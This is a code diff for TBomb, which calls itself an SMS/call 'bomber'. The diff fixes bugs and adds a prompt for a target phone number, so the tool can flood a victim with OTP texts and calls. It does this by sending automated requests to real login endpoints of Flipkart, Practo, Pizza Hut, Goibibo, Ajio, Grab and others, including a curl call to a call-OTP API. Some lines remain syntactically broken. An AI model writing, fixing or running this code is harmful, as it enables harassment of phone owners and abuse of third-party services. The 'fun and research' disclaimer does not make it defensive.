@@ -117,7 +117,7 @@ def getapi(pn, lim, cc):
         headers = sitedata["flipkart6"]["headers"]
         data = sitedata["flipkart6"]["data"]
         data["loginId"] = "+" + cc + pn
-        response = request.post(hyperurl, headers=headers, json=data)
+        response = requests.post(hyperurl, headers=headers, json=data)
         return response.status_code==200
     elif lim==7:
         hyperurl = sitedata["flipkart5"]["hyperurl"]
@@ -125,21 +125,21 @@ def getapi(pn, lim, cc):
         headers = sitedata["flipkart5"]["headers"]
         data = sitedata["flipkart5"]["data"]
         data["loginId"] = "+" + cc + pn
-        response = request.post(hyperurl, headers=headers, cookies=cookies, data=data)
+        response = requests.post(hyperurl, headers=headers, cookies=cookies, data=data)
         return response.status_code==200
     elif lim == 8:
         hyperurl = sitedata["ref-r"]["hyperurl"]
         headers = sitedata["ref-r"]["headers"]
         data = sitedata["ref-r"]["data"]
         data["mobile"] = pn
-        response = request.post(hyperurl, headers=headers, data=data)
+        response = requests.post(hyperurl, headers=headers, data=data)
         return response.status_code==200
     elif lim == 9:
         hyperurl = sitedata["practo"]["hyperurl"]
         headers = sitedata["practo"]["headers"]
         data = sitedata["practo"]["data"]
         data["mobile"] = "+" + cc + pn
-        response = request.post(hyperurl, headers=headers, data=data)
+        response = requests.post(hyperurl, headers=headers, data=data)
         return response.text.find("success") != -1 
     elif lim == 10:
         hyperurl = sitedata["pizzahut"]["hyperurl"]
@@ -147,21 +147,21 @@ def getapi(pn, lim, cc):
         data = sitedata["pizzahut"]["data"]
         data["customer"]["MobileNo"] = pn
         data["customer"]["UserName"] = pn
-        response = request.post(hyperurl, headers=headers, data=data)
+        response = requests.post(hyperurl, headers=headers, data=data)
         return response.status_code==200
     elif lim == 11:
         hyperurl = sitedata["goibibo"]["hyperurl"]
         headers = sitedata["goibibo"]["headers"]
         data = sitedata["goibibo"]["data"]
         data["mbl"] = pn
-        response = request.post(hyperurl, headers=headers, data=data)
+        response = requests.post(hyperurl, headers=headers, data=data)
         return response.status_code==200
     elif lim == 12:
         hyperurl = sitedata["apollopharmacy"]["hyperurl"]
         headers = sitedata["apollopharmacy"]["headers"]
         data = sitedata["apollopharmacy"]["data"]
         data["mobile"] = pn
-        response = request.post(hyperurl, headers=headers, data=data)
+        response = requests.post(hyperurl, headers=headers, data=data)
         return response.status_code==200
     elif lim == 13:
         hyperurl = sitedata["ajio"]["hyperurl"]
@@ -169,7 +169,7 @@ def getapi(pn, lim, cc):
         headers = sitedata["ajio"]["headers"]
         data = sitedata["ajio"]["data"]
         data["mobileNumber"] = pn
-        response = request.post(hyperurl, headers=headers, cookies=cookies, json=data)
+        response = requests.post(hyperurl, headers=headers, cookies=cookies, json=data)
         return response.text.find("\"statusCode\":\"1\"") != -1
     elif lim == 14:
         hyperurl = sitedata["altbalaji"]["hyperurl"]
@@ -177,7 +177,7 @@ def getapi(pn, lim, cc):
         data = sitedata["altbalaji"]["data"]
         data["country_code"] = cc
         data["phone_number"] = pn
-        response = request.post(hyperurl, headers=headers, json=data)
+        response = requests.post(hyperurl, headers=headers, json=data)
         return response.text == "24f467b24087ff48c96321786d89c69f"
     elif lim == 15:
         hyperurl = sitedata["aala"]["hyperurl"]
@@ -185,13 +185,13 @@ def getapi(pn, lim, cc):
         headers = sitedata["aala"]["headers"]
         data = sitedata["aala"]["data"]
         data["email"] = cc + pn
-        response = request.post(hyperurl, headers=headers, cookies=cookies json=data)
+        response = requests.post(hyperurl, headers=headers, cookies=cookies json=data)
         return response.text.find("code:") != -1
     elif lim == 16:
         hyperurl = sitedata["grab"]["hyperurl"]
         data = sitedata["grab"]["data"]
         data["phoneNumber"] = cc + pn
-        response = request.post(hyperurl, data=data)
+        response = requests.post(hyperurl, data=data)
         return response.status_code==200
     elif lim == 100:
         rd = os.popen('curl -s -X GET "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/' +  pn + '?callType=otpOnCall"').read()
@@ -229,7 +229,7 @@ def start(target, counter, delay, ch, cc):
         clerscrn()
         banntext()
         try:
-            api = random_choice(ch)
+            api = random.choice(ch)
         except Exception:
             if cc == "91":
                 print("All API endpoints seem to have expired or patched up" + "\n" + \
@@ -271,7 +271,7 @@ def start(target, counter, delay, ch, cc):
             time.sleep(float(delay))
             if requested % 3 == 0:
                 chekintr()
-    print(W)
+    #print(W)
     print("Bombing completed!")
     os.system("rm *.xxx* > /dev/null 2>&1")
     banntext()
@@ -311,6 +311,28 @@ def notifyen():
         pass
 
 def callbomb():
+    while True:
+        pn = ""
+        cc = input("Enter your country code (Without +) ")
+        if "+" in cc:
+            tc = list(cc)
+            tc.remove('+')
+            cc = "".join(tc)
+            cc = cc.strip()
+        pn = input("Enter the target number +" + cc + " ")
+        pn = remsp(pn)
+        if len(cc) >= 4 or len(cc) < 1:
+            print("Invalid country code" + "\n" + "Country codes are generally 1-3 digits long")
+            continue
+        if len(pn) <= 6:
+            print("The phone number that you have entered is not valid")
+            continue
+        for cch in str(cc + pn):
+            if not cch.isdigit():
+                print("The phone number is expected to contain only numeric characters")
+                continue
+        break
+    type = 0
     try:
         if sys.argv[1] == "call":
             type = 1
@@ -374,7 +396,7 @@ def callbomb():
             print("The range of 20-25 is highly recommended" + "\n" + "Resuming operation...")
         print("This script is experimental and can be incredibly fast")
         t = [None] * nt
-        print(random.choice(colors))
+        #print(random.choice(colors))
         print("Gearing up the call bomber - Please be patient" + "\n" + \
               "Please stay connected to the internet during bombing" + "\n" + \
               "Target number     : +91 " + pn + "\n" + \
@@ -382,7 +404,7 @@ def callbomb():
               "Delay per call    : " + dl + " seconds" + "\n" + \
               "This tool was made for fun and research purposes only" + "\n" + \
               "TBomb was created by SpeedX")
-        print(W)
+        #print(W)
         input("Press [CTRL+Z] to suspend the bomber" + "\n" + "Press [ENTER] to start it")
         os.system('rm *.xxx* > /dev/null 2>&1')
         print("Starting bomber....")
@@ -394,7 +416,7 @@ def callbomb():
         ci = 0
         while True:
             ci += 1
-            l = count_inf
+            l = countinf
             print("Total Number of Requests Sent : ", l)
             if int(l) > maxlim:
                 print("Due to the script abuse, we can provide only " + str(maxlim) + " messages at once")
@@ -413,6 +435,6 @@ if __name__ == "__main__":
     clerscrn()
     banntext()
     chekintr()
-    update()
+    #update()
     notifyen()
     callbomb()
